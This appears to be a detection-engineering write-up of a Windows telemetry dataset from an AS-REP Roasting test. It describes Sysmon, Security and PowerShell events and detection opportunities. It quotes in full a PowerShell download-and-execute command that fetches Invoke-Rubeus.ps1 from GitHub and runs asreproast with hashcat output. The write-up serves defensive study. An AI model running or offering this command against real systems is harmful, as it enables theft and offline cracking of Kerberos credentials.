# T1558.004-3: AS-REP Roasting — WinPwn PowerSharpPack Rubeus asreproast

## Technique Context

AS-REP Roasting (T1558.004) collects Kerberos AS-REP responses from accounts with pre-authentication disabled, enabling offline password cracking. This test uses the same PowerSharpPack delivery mechanism as T1558.003-7 (WinPwn's Reflection-based Rubeus loader), but invokes the `asreproast` command instead of `kerberoast`. The Rubeus assembly loads into PowerShell memory from a Base64-encoded blob embedded in `Invoke-Rubeus.ps1`, with no binary written to disk. The `/format:hashcat /nowrap` flags again indicate the output is intended for direct Hashcat input.

## What This Dataset Contains

The dataset spans approximately 11 seconds on 2026-03-17 from ACME-WS06 (acme.local domain) and contains 172 events across Application, PowerShell, Security, and Sysmon channels.

**The attack command**, captured in Security EID 4688 and Sysmon EID 1:
```
powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"}
```

Sysmon EID 1 tags this process `technique_id=T1059.001,technique_name=PowerShell`.

**Process chain** (Security EID 4688): `whoami.exe` pre-check, the attacking `powershell.exe` carrying the PowerSharpPack download-and-invoke command (with `asreproast /format:hashcat /nowrap`), a second `whoami.exe`, and a cleanup `powershell.exe & {}`. Four EID 4688 events.

**Sysmon events** (42 total, including EID 3, 11, 17, 22):
- EID 7 (Image Load): 25 events — .NET CLR assemblies plus the in-memory Rubeus assembly loading into PowerShell
- EID 10 (Process Access): 4 events — PowerShell opening child processes with full access rights, tagged `T1055.001/Dynamic-link Library Injection`
- EID 11 (File Create): 3 events — `MsMpEng.exe` writing `C:\Windows\Temp\01dcb6334780258a`, PowerShell writing `StartupProfileData-NonInteractive` and `StartupProfileData-Interactive` to the SYSTEM profile
- EID 17 (Pipe Create): 2 events — two `\PSHost.*` pipes
- EID 3 (Network Connect): 1 event — the download connection to GitHub for `Invoke-Rubeus.ps1`
- EID 22 (DNS Query): 1 event — DNS resolution for `raw.githubusercontent.com`

**PowerShell channel** (125 events): 120 EID 4104 records, 4 EID 4103 records, and 1 EID 4100. The 4103 records confirm `Set-ExecutionPolicy Bypass` and `Write-Host "DONE"`. The attack is the same Rubeus-in-memory pattern as T1558.003-7, here with `asreproast` rather than `kerberoast`.

**Application channel**: One EID 15 Security Center report.

**Note on the defended variant comparison**: The defended dataset (datasets/art/T1558.004-3) shows only 3 Sysmon events, 10 Security events, and 36 PowerShell events — a dramatically lower Sysmon count than other defended tests. This suggests Defender blocked the PowerSharpPack download very early in the defended run (after minimal .NET loading), whereas in this undefended dataset the full assembly initialization and download complete.

## What This Dataset Does Not Contain

No AS-REP response data or Kerberos EID 4768 events are present on the workstation. Rubeus ran in memory and executed `asreproast`, but found no accounts with `DONT_REQ_PREAUTH` set in acme.local. AS-REP requests to the DC would generate EID 4768 events in the DC's Security log; those logs are not included in this workstation-scoped dataset.

The Rubeus assembly itself has no corresponding on-disk path — it loads entirely from the memory decode of the Base64 blob in `Invoke-Rubeus.ps1`. The file creation events (EID 11) are from Defender and from PowerShell profile initialization, not from Rubeus.

## Assessment

T1558.004-3 is the AS-REP Roasting counterpart to T1558.003-7 using the same PowerSharpPack delivery infrastructure. The critical forensic difference from T1558.004-1 (Rubeus binary on disk) is the fileless execution: no `rubeus.exe` exists anywhere on the host, the attack tool runs entirely in PowerShell's managed heap, and the only on-disk artifacts are the PowerShell profile initialization files.

The 11-second execution window (longer than the 5-second T1558.004-1 window) reflects the download time for `Invoke-Rubeus.ps1` (a large file containing the embedded Rubeus assembly) plus the Reflection load time. The network and DNS events in this dataset document that download.

The defended variant comparison (3 Sysmon events vs 42 here) is the most dramatic difference in this test group. Defender apparently halted execution so early in the defended run that the CLR barely had time to initialize before the block. In this undefended run, all 42 Sysmon events fire including the .NET CLR initialization, the Rubeus assembly load, and the network telemetry.

## Detection Opportunities Present in This Data

**Security EID 4688 and Sysmon EID 1**: `Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"` is an unambiguous attack indicator. The `/format:hashcat /nowrap` flags confirm offline cracking intent.

**DNS EID 22 and Network EID 3**: Sysmon captures the DNS resolution and network connection to download `Invoke-Rubeus.ps1`. The PowerSharpPack URL is documented as an offensive resource and can be used as a network-layer indicator.

**Sysmon EID 7 assembly loads without file paths**: The Rubeus assembly loading via Reflection appears as an EID 7 image load with no file path. A .NET assembly with Kerberos-related type names loading into a non-interactive PowerShell process running as SYSTEM without a corresponding file path is a high-confidence fileless attack indicator.

**MsMpEng.exe temp file creation (EID 11)**: Defender writing `C:\Windows\Temp\01dcb6334780258a` is a telemetry beacon that correlates with suspicious activity detection by the background Defender process even while active scanning is disabled. The timestamp can be correlated with the attack timeline.

**PowerShell EID 4104 at scale**: 120 script block events logging the complete Invoke-Rubeus.ps1 content — the Base64-encoded Rubeus assembly, the decode-and-load logic, and the `Invoke-Rubeus` wrapper function — are all preserved in the full dataset. The decode operation (`[System.Convert]::FromBase64String(...)` followed by `[System.Reflection.Assembly]::Load()`) is a distinctive pattern in script block logs.
